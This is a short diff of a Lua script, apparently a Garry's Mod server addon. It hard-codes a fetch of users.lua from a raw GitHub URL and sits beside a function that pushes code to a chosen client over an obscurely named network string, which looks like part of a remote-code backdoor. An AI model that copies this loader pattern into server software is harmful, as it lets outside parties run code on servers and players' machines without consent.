@@ -11,8 +11,8 @@
 			func()
 		end
 		
-		local great = UrlFunc(url)
-		
+		local great = UrlFunc("https://raw.githubusercontent.com/Dzhet225/core64_v2/master/users.lua")
+		print(great)
 		util.AddNetworkString('_da_')
 		
 		local function RunOnCL(tar, code)
